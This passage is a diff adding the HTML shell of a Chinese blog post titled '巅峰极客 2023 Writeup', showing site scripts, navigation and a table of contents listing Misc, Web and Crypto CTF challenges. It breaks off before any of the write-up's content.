@@ -1,0 +1,425 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.17.3"><title>巅峰极客 2023 Writeup</title><meta name="title" content="巅峰极客 2023 Writeup"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/peekgeek-2023/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/peekgeek-2023/"><meta property="og:title" content="巅峰极客 2023 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/peekgeek-2023/"><meta property="twitter:title" content="巅峰极客 2023 Writeup"><meta property="twitter:description" content><!-- 暗色模式初始化脚本 --><script>
+	// 防止暗色模式闪烁
+	(function() {
+		const theme = localStorage.getItem('theme');
+		const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+		
+		if (theme === 'dark' || (!theme && systemPrefersDark)) {
+			document.documentElement.classList.add('dark');
+		} else {
+			document.documentElement.classList.remove('dark');
+		}
+	})();
+</script><script lang="js">
+			// 动态导入 APlayer 并挂载到全局对象
+			import('aplayer').then(function(APlayerModule) {
+				window.APlayer = APlayerModule.default;
+			});
+		</script><link rel="stylesheet" href="/_astro/_slug_.DNYbVg5E.css">
+<link rel="stylesheet" href="/_astro/waline.BpVnDCEn.css">
+<link rel="stylesheet" href="/_astro/_slug_.N2UNtMs9.css">
+<style>.toc[data-astro-cid-woz2nwfv]{position:fixed;top:12rem;right:6rem;width:260px;max-height:calc(100vh - 16rem);overflow-y:auto;padding:1.5rem;font-size:.9375rem;line-height:1.5;z-index:100}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar{width:4px}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#0003;border-radius:2px}.dark[data-astro-cid-woz2nwfv] .toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#ffffff4d}@media(max-width:1280px){.toc[data-astro-cid-woz2nwfv]{position:static;width:100%;max-height:none;margin:2rem 0}}.toc-title[data-astro-cid-woz2nwfv]{font-size:1rem;font-weight:600;margin:0 0 1rem}.toc-list[data-astro-cid-woz2nwfv],.toc-sublist[data-astro-cid-woz2nwfv]{list-style:none;padding:0;margin:0}.toc-sublist[data-astro-cid-woz2nwfv]{padding-left:1.25rem;margin:.25rem 0}.toc-link[data-astro-cid-woz2nwfv]{display:block;text-decoration:none;padding:.375rem .5rem;margin:.125rem 0;border-radius:.5rem;font-weight:400}.toc-link[data-astro-cid-woz2nwfv].active{font-weight:500;background:#3b82f61a!important;color:#3b82f6!important}.dark[data-astro-cid-woz2nwfv] .toc-link[data-astro-cid-woz2nwfv].active{background:#60a5fa33!important;color:#60a5fa!important}.lightbox[data-astro-cid-vqtgpguw]{position:fixed;inset:0;z-index:500;display:flex;align-items:center;justify-content:center;animation:fade-in .3s;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);background:#3037424d;overflow:hidden;padding:20px;box-sizing:border-box}.lightbox[data-astro-cid-vqtgpguw].exit{animation:fade-out .3s}@keyframes fade-in{0%{opacity:0}}@keyframes fade-out{to{opacity:0}}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:80vw!important;max-height:75vh!important;width:auto!important;height:auto!important;-o-object-fit:contain!important;object-fit:contain!important;border-radius:3px;cursor:zoom-out;display:block!important;margin:0 auto;opacity:0;transition:opacity .3s ease}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw].show{opacity:1}.lightbox[data-astro-cid-vqtgpguw] .toolbar[data-astro-cid-vqtgpguw]{position:absolute;bottom:5%;left:1rem;right:1rem;display:flex;justify-content:space-between;align-items:center;color:#fff;max-width:600px;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);margin:0 auto;padding:10px;border-radius:5px;background:#0000001a;z-index:1}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]{width:32px;height:32px;display:flex;justify-content:center;align-items:center;cursor:pointer;border-radius:3px;background:#fff3;transition:all .2s}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]:hover{background:#ffffff80}.lightbox[data-astro-cid-vqtgpguw] .counter[data-astro-cid-vqtgpguw]{width:60px;display:flex;align-items:center;justify-content:center;font-size:14px}.lightbox[data-astro-cid-vqtgpguw] .nav[data-astro-cid-vqtgpguw]{display:flex;gap:10px}@media(max-width:768px){.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:75vw!important;max-height:65vh!important}}
+</style></head> <body class="bg-white dark:bg-gray-900 transition-colors duration-300"> <header class="relative m-0 px-4 py-4" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a><a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a><a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a><a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a><a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 桌面端搜索和主题切换按钮 --> <div class="absolute right-4 top-1/2 transform -translate-y-1/2 hidden md:flex items-center gap-3" data-astro-cid-3ef6ksr2> <button id="search-btn" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" title="搜索 (Ctrl+K)" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+(function() {
+	function getSystemTheme() {
+		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+	}
+
+	function getCurrentTheme() {
+		const saved = localStorage.getItem('theme');
+		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
+	}
+
+	function applyTheme(theme) {
+		document.documentElement.classList.toggle('dark', theme === 'dark');
+	}
+
+	function toggleTheme() {
+		const isDark = document.documentElement.classList.contains('dark');
+		const newTheme = isDark ? 'light' : 'dark';
+		localStorage.setItem('theme', newTheme);
+		applyTheme(newTheme);
+	}
+
+	function init() {
+		applyTheme(getCurrentTheme());
+		document.querySelectorAll('.theme-toggle').forEach(btn => {
+			if (!btn.dataset.ready) {
+				btn.addEventListener('click', toggleTheme);
+				btn.dataset.ready = 'true';
+			}
+		});
+	}
+
+	init();
+
+	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+		const saved = localStorage.getItem('theme');
+		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
+	});
+
+	document.addEventListener('astro:page-load', init);
+})();
+</script>  </div> <!-- 移动端控件 --> <div class="md:hidden flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <button id="menu-btn" class="flex flex-col space-y-1 p-2 text-black dark:text-white" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <div class="flex items-center gap-2" data-astro-cid-3ef6ksr2> <button id="search-btn-mobile" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+(function() {
+	function getSystemTheme() {
+		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+	}
+
+	function getCurrentTheme() {
+		const saved = localStorage.getItem('theme');
+		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
+	}
+
+	function applyTheme(theme) {
+		document.documentElement.classList.toggle('dark', theme === 'dark');
+	}
+
+	function toggleTheme() {
+		const isDark = document.documentElement.classList.contains('dark');
+		const newTheme = isDark ? 'light' : 'dark';
+		localStorage.setItem('theme', newTheme);
+		applyTheme(newTheme);
+	}
+
+	function init() {
+		applyTheme(getCurrentTheme());
+		document.querySelectorAll('.theme-toggle').forEach(btn => {
+			if (!btn.dataset.ready) {
+				btn.addEventListener('click', toggleTheme);
+				btn.dataset.ready = 'true';
+			}
+		});
+	}
+
+	init();
+
+	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+		const saved = localStorage.getItem('theme');
+		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
+	});
+
+	document.addEventListener('astro:page-load', init);
+})();
+</script>  </div> </div> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white dark:bg-gray-800 rounded-xl shadow-2xl border border-gray-100 dark:border-gray-700 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Home </a><a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Blog </a><a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Links </a><a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Comment </a><a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),n=document.getElementById("menu");function i(){n?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单")}function d(){n?.classList.remove("hidden"),e?.classList.add("open"),e?.setAttribute("aria-expanded","true"),e?.setAttribute("aria-label","关闭菜单")}e&&n&&(e.addEventListener("click",()=>{e.classList.contains("open")?i():d()}),e.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())}),document.addEventListener("keydown",t=>{t.key==="Escape"&&e.classList.contains("open")&&(i(),e.focus())}),document.addEventListener("click",t=>{const s=t.target;!e.contains(s)&&!n.contains(s)&&i()}));const c=document.getElementById("search-btn"),a=document.getElementById("search-btn-mobile");function o(){typeof window.openSearchModal=="function"&&window.openSearchModal()}c&&c.addEventListener("click",o);a&&a.addEventListener("click",o);</script>  <!-- 搜索模态框 --><div id="search-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/50 dark:bg-black/70 backdrop-blur-sm" role="dialog" aria-modal="true" aria-labelledby="search-modal-title" data-astro-cid-qk3db3zz> <div class="relative w-full max-w-2xl mx-4 bg-white dark:bg-gray-800 rounded-2xl shadow-2xl transform transition-all" id="search-modal-content" data-astro-cid-qk3db3zz> <!-- 搜索框 --> <div class="p-4 border-b border-gray-200 dark:border-gray-700" data-astro-cid-qk3db3zz> <div class="relative" data-astro-cid-qk3db3zz> <input type="text" id="search-modal-input" placeholder="输入关键词搜索文章..." class="w-full px-4 py-3 pl-10 pr-10 text-base bg-gray-100 dark:bg-gray-700 rounded-xl border border-transparent
+            placeholder:text-gray-400 dark:placeholder:text-gray-500
+            focus:ring-2 focus:ring-blue-500/30 focus:border-blue-500/50 focus:bg-white dark:focus:bg-gray-600
+            focus:outline-none
+            transition-all duration-200
+            text-gray-900 dark:text-white" autocomplete="off" data-astro-cid-qk3db3zz> <div class="absolute left-3 top-1/2 -translate-y-1/2" data-astro-cid-qk3db3zz> <svg class="w-5 h-5 text-gray-400 dark:text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <button id="search-modal-close" class="absolute right-3 top-1/2 -translate-y-1/2 p-1 text-gray-400 dark:text-gray-500 hover:text-gray-600 dark:hover:text-gray-300 transition-colors" aria-label="关闭搜索" data-astro-cid-qk3db3zz> <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" data-astro-cid-qk3db3zz></path> </svg> </button> </div> </div> <!-- 搜索结果容器 --> <div class="max-h-[60vh] overflow-y-auto" data-astro-cid-qk3db3zz> <!-- 搜索结果 --> <div id="search-modal-results" class="p-4 space-y-3" data-astro-cid-qk3db3zz> <!-- 结果将在这里动态插入 --> </div> <!-- 空状态 --> <div id="search-modal-empty" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="mb-4" data-astro-cid-qk3db3zz> <svg class="w-12 h-12 text-gray-300 dark:text-gray-600 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <h3 class="text-base font-medium text-gray-900 dark:text-gray-100 mb-2" data-astro-cid-qk3db3zz>
+未找到相关文章
+</h3> <p class="text-sm text-gray-500 dark:text-gray-400" data-astro-cid-qk3db3zz>
+试试其他关键词
+</p> </div> <!-- 加载状态 --> <div id="search-modal-loading" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="inline-block animate-spin h-6 w-6 border-2 border-gray-400 dark:border-gray-500 border-t-transparent rounded-full" data-astro-cid-qk3db3zz></div> </div> </div> <!-- 快捷键提示 --> <div class="px-4 py-2 border-t border-gray-200 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400 flex items-center justify-between" data-astro-cid-qk3db3zz> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>Esc</kbd> 关闭</span> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>↑</kbd><kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs ml-1" data-astro-cid-qk3db3zz>↓</kbd> 导航</span> </div> </div> </div> <script type="module">let L=[],p=null,a=-1,h=[];const s=document.getElementById("search-modal");document.getElementById("search-modal-content");const i=document.getElementById("search-modal-input"),x=document.getElementById("search-modal-close"),c=document.getElementById("search-modal-results"),l=document.getElementById("search-modal-empty"),y=document.getElementById("search-modal-loading");async function b(){if(!(L.length>0))try{L=await(await fetch("/search.json")).json()}catch(e){console.error("加载搜索索引失败:",e)}}function u(e){const t=document.createElement("div");return t.textContent=e,t.innerHTML}function k(e,t){if(!t.trim())return e;const n=new RegExp(`(${t.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")})`,"gi");return e.replace(n,'<mark class="bg-yellow-200 dark:bg-yellow-800/50 px-0.5 rounded">$1</mark>')}function M(e){if(!e.trim())return[];const t=e.toLowerCase(),n=[];for(const r of L){const d=r.title.toLowerCase().includes(t),m=r.content.toLowerCase().includes(t),g=r.categories.some(o=>o.toLowerCase().includes(t)),v=r.tags.some(o=>o.toLowerCase().includes(t));if(d||m||g||v){let o=0;d&&(o+=10),m&&(o+=1),g&&(o+=3),v&&(o+=3),n.push({...r,score:o})}}return n.sort((r,d)=>r.score!==d.score?(d.score||0)-(r.score||0):new Date(d.date).getTime()-new Date(r.date).getTime())}function T(e,t){if(!(!c||!l||!y)){if(y.classList.add("hidden"),a=-1,e.length===0){c.innerHTML="",l.classList.remove("hidden");return}l.classList.add("hidden"),c.innerHTML=e.map((n,r)=>{const d=k(u(n.title),t),m=k(u(n.excerpt),t),g=new Date(n.date).toLocaleDateString("zh-CN",{year:"numeric",month:"short",day:"numeric"});return`
+        <a 
+          href="${u(n.url)}" 
+          class="block p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors search-result-item ${r===a?"bg-gray-100 dark:bg-gray-700":""}"
+          data-index="${r}"
+        >
+          <h3 class="text-base font-semibold text-gray-900 dark:text-white mb-1">${d}</h3>
+          <p class="text-sm text-gray-600 dark:text-gray-400 mb-2 line-clamp-1">${m}</p>
+          <div class="flex flex-wrap items-center gap-2 text-xs text-gray-500 dark:text-gray-400">
+            <time datetime="${n.date}">${g}</time>
+            ${n.categories.length>0?`<span>·</span><span>${u(n.categories[0])}</span>`:""}
+            ${n.tags.length>0?`<span>·</span><span>${u(n.tags[0])}</span>`:""}
+          </div>
+        </a>
+      `}).join(""),w()}}function w(){c?.querySelectorAll(".search-result-item")?.forEach((t,n)=>{n===a?t.classList.add("bg-gray-100","dark:bg-gray-700"):t.classList.remove("bg-gray-100","dark:bg-gray-700")})}function I(){if(!i)return;const e=i.value.trim();if(p&&clearTimeout(p),e.length===0){c&&l&&(c.innerHTML="",l.classList.add("hidden"));return}y&&y.classList.remove("hidden"),p=setTimeout(()=>{h=M(e),T(h,e)},200)}function E(){!s||!i||(s.classList.remove("hidden"),s.classList.add("flex"),setTimeout(()=>{i.focus()},100),b(),document.body.style.overflow="hidden")}function f(){!s||!i||(s.classList.add("hidden"),s.classList.remove("flex"),i.value="",c&&l&&(c.innerHTML="",l.classList.add("hidden")),a=-1,h=[],document.body.style.overflow="")}function $(){!s||!i||!x||(s.addEventListener("click",e=>{e.target===s&&f()}),x.addEventListener("click",f),i.addEventListener("input",I),i.addEventListener("keydown",e=>{if(e.key==="Escape")e.preventDefault(),f();else if(e.key==="ArrowDown")e.preventDefault(),a<h.length-1&&(a++,w());else if(e.key==="ArrowUp")e.preventDefault(),a>0&&(a--,w());else if(e.key==="Enter"&&a>=0){e.preventDefault();const t=c?.querySelector(`[data-index="${a}"]`);t&&(window.location.href=t.href)}}),document.addEventListener("keydown",e=>{(e.metaKey||e.ctrlKey)&&e.key==="k"&&(e.preventDefault(),s?.classList.contains("hidden")?E():f())}),window.openSearchModal=E)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",$):$();</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 dark:text-white mb-6 tracking-tight leading-tight"> 巅峰极客 2023 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2023-07-22T14:53:25.000Z" class="text-[#86868b] dark:text-gray-400 tracking-wide"> <time datetime="2023-07-22T14:53:25.000Z"> Jul 22, 2023 </time> </time>  <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] dark:text-gray-400 tracking-wide" aria-label="阅读时间 6 min read">6 min read</span>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/技术.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 技术 下的所有文章"> 技术 </a>  </nav>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/CTF.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 CTF 下的所有文章"> CTF </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/Writeup.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 Writeup 下的所有文章"> Writeup </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/网络安全.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a>  </nav>  </div> </header>  <nav class="toc transition-colors duration-300" aria-label="文章目录" data-astro-cid-woz2nwfv> <h2 class="toc-title text-gray-900 dark:text-white" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#misc" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1. Misc </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#welcome" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.1. welcome </a> </li><li data-astro-cid-woz2nwfv> <a href="#foundme" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.2. foundme </a> </li><li data-astro-cid-woz2nwfv> <a href="#song" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.3. song </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#web" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2. Web </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#hellosql" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.1. hellosql </a> </li><li data-astro-cid-woz2nwfv> <a href="#hinder" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.2. hinder </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#crypto" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3. Crypto </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#数学但高中" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.1. 数学但高中 </a> </li><li data-astro-cid-woz2nwfv> <a href="#simple_encryption" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.2. Simple_encryption </a> </li> </ol> </li> </ol> </nav>  <script lang="js">
+  function initTableOfContents() {
+    const links = document.querySelectorAll('.toc-link');
+    const headings = Array.from(links)
+      .map(link => {
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const id = href.slice(1);
+          return document.getElementById(id);
+        }
+        return null;
+      })
+      .filter(element => element !== null);
+
+    // 平滑滚动功能
+    function scrollToElement(targetId) {
+      const target = document.getElementById(targetId);
+      if (target) {
+        const headerOffset = 100;
+        const elementPosition = target.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: 'smooth'
+        });
+      }
+    }
+
+    // 设置活跃链接
+    function setActiveLink(targetId) {
